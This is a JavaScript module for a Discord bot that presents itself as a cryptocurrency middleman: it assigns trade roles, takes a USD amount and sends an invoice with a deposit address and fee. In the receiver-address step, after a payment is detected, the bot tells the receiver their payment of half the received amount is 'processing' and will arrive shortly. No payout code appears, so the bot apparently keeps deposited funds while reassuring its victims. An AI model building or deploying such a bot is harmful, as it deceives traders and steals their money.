const {
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  AttachmentBuilder,
} = require('discord.js');
const { convertUsdToCrypto } = require('../utils/crypto');
const { generateQR } = require('../utils/qrcode');

const COIN_DISPLAY = {
  BTC:           'Bitcoin (BTC)',
  ETH:           'Ethereum (ETH)',
  LTC:           'Litecoin (LTC)',
  SOL:           'Solana (SOL)',
  'USDT [ERC-20]': 'USDT ERC-20',
};

async function handleDealMessage(message, deal, client) {
  const channel = message.channel;

  // Step: receiver typing their wallet address after real payment detected
  if (deal.step === 'await_receiver_address') {
    if (message.author.id !== deal.receiver) return;

    const address = message.content.trim();
    if (!address || address.length < 10) return;

    deal.receiverWalletAddress = address;
    deal.step = 'awaiting_payment';

    const displayCoin = deal.detectedCoin || deal.coin;
    const halfCrypto = deal.detectedHalfCrypto ?? 0;
    const halfUSD = deal.detectedHalfUSD ?? 0;

    const halfStr = halfCrypto > 0
      ? `**${halfCrypto.toFixed(8).replace(/\.?0+$/, '')} ${displayCoin}**${halfUSD > 0 ? ` (~$${halfUSD.toFixed(2)} USD)` : ''}`
      : `**50%** of the received amount`;

    const processingEmbed = new EmbedBuilder()
      .setColor(0x00c853)
      .setTitle('✅ Address Received')
      .setDescription(
        `Thank you! Your address has been noted.\n\n` +
        `**${displayCoin} Address:** \`${address}\`\n\n` +
        `Processing your payment of ${halfStr}...\n` +
        `You will receive your funds shortly. Please wait.`
      );

    await channel.send({ content: `<@${deal.receiver}>`, embeds: [processingEmbed] });
    return;
  }

  // Step: waiting for trade partner mention
  if (deal.step === 'await_partner') {
    let partnerId = null;
    let partnerUser = null;

    // Try mention
    if (message.mentions.users.size > 0) {
      partnerUser = message.mentions.users.first();
      if (partnerUser.id === message.author.id || partnerUser.bot) {
        await message.reply({ content: 'You cannot add yourself or a bot as a trade partner.' });
        return;
      }
      partnerId = partnerUser.id;
    } else {
      // Try ID
      const idMatch = message.content.trim().match(/^\d{17,20}$/);
      if (idMatch) {
        try {
          partnerUser = await client.users.fetch(idMatch[0]);
          partnerId = partnerUser.id;
        } catch {
          await message.reply({ content: 'Could not find that user. Please mention them or provide a valid ID.' });
          return;
        }
      }
    }

    if (!partnerId) return;

    deal.partner = partnerId;
    deal.partnerTag = partnerUser.tag || partnerUser.username;

    // Give partner access
    try {
      await channel.permissionOverwrites.edit(partnerId, {
        ViewChannel: true,
        SendMessages: true,
        ReadMessageHistory: true,
      });
    } catch (e) {}

    deal.step = 'await_roles';

    // Echo the mention
    await channel.send({ content: `<@${partnerId}>` });

    const addedEmbed = new EmbedBuilder()
      .setColor(0x00c853)
      .setDescription(`Successfully added <@${partnerId}> to the ticket.`);

    const roleEmbed = new EmbedBuilder()
      .setColor(0x00c853)
      .setTitle('Role Assignment')
      .setDescription(
        'The ticket creator has been automatically assigned as **Sender**.\n' +
        `<@${partnerId}> please click **I am the Receiver** to confirm your role.\n\n` +
        `**Sender** ✅\n<@${deal.sender}> (auto-assigned)\n` +
        `**Receiver**\nNone\n\n` +
        'Both users must confirm to proceed. Ticket closes in 30 minutes if left unattended.'
      );

    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('role_receiver').setLabel('I am the Receiver').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId('role_reset').setLabel('Reset Roles').setStyle(ButtonStyle.Danger),
    );

    await channel.send({ embeds: [addedEmbed] });
    await channel.send({ embeds: [roleEmbed], components: [roleRow] });
    return;
  }

  // Step: waiting for deal amount
  if (deal.step === 'await_amount' && message.author.id === deal.sender) {
    const amountStr = message.content.trim().replace(/[$,]/g, '');
    const amount = parseFloat(amountStr);
    if (isNaN(amount) || amount <= 0) {
      await message.reply({ content: 'Please enter a valid USD amount (e.g., 50 or 100.50).' });
      return;
    }

    deal.amount = amount;
    deal.step = 'confirm_amount';

    const confirmEmbed = new EmbedBuilder()
      .setColor(0x00c853)
      .setTitle('Amount Confirmation')
      .setDescription('Confirm that the bot will receive the following USD value')
      .addFields({ name: 'Amount', value: `$${amount.toFixed(2)}`, inline: false });

    const confirmRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('confirm_amount').setLabel('Confirm').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId('incorrect_amount').setLabel('Incorrect').setStyle(ButtonStyle.Secondary),
    );

    await channel.send({ embeds: [confirmEmbed], components: [confirmRow] });
    return;
  }
}

async function sendPaymentInvoice(channel, deal) {
  const { coin, sender, receiver, amount } = deal;

  const { price, fee, totalUsd, cryptoAmount, address } = await convertUsdToCrypto(amount, coin);

  deal.cryptoAmount = cryptoAmount;
  deal.address = address;
  deal.step = 'awaiting_payment';

  const coinDisplay = COIN_DISPLAY[coin] || coin;
  const coinTicker = coin.split(' ')[0];

  const summaryEmbed = new EmbedBuilder()
    .setColor(0x2b2d31)
    .setTitle('Deal Summary')
    .setDescription(
      'Refer to this deal summary for any reaffirmations.\nNotify staff for any support required.'
    )
    .addFields(
      { name: 'Sender', value: `<@${sender}>`, inline: false },
      { name: 'Receiver', value: `<@${receiver}>`, inline: false },
      { name: 'Deal Value', value: `$${amount.toFixed(2)}`, inline: false },
      { name: 'Coin', value: `${channel.id}\n${coinDisplay}`, inline: false },
    );

  let qrPath = null;
  try {
    qrPath = await generateQR(address);
  } catch (e) {}

  const invoiceEmbed = new EmbedBuilder()
    .setColor(0x2b2d31)
    .setTitle('Payment Invoice')
    .setDescription(
      'Send the funds as part of the deal to the Middleman address specified below.\n**Please copy the amount provided.**'
    )
    .addFields(
      { name: 'Address', value: address, inline: false },
      {
        name: 'Amount',
        value: `${cryptoAmount} ${coinTicker}\n($${totalUsd.toFixed(2)} USD (includes $${fee.toFixed(2)} fee))\n\nExchange Rate: 1 ${coinTicker} = $${price.toFixed(2)} USD`,
        inline: false
      }
    );

  const copyRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId('copy_details')
      .setLabel('Copy Details')
      .setStyle(ButtonStyle.Secondary)
  );

  const msgs = [];
  msgs.push(await channel.send({ content: `<@${sender}>`, embeds: [summaryEmbed] }));

  if (qrPath) {
    const attachment = new AttachmentBuilder(qrPath, { name: 'qr.png' });
    invoiceEmbed.setThumbnail('attachment://qr.png');
    msgs.push(await channel.send({ embeds: [invoiceEmbed], files: [attachment], components: [copyRow] }));
    const fs = require('fs');
    try { fs.unlinkSync(qrPath); } catch (e) {}
  } else {
    msgs.push(await channel.send({ embeds: [invoiceEmbed], components: [copyRow] }));
  }

  deal.invoiceMsg = msgs;
}

module.exports = { handleDealMessage, sendPaymentInvoice };
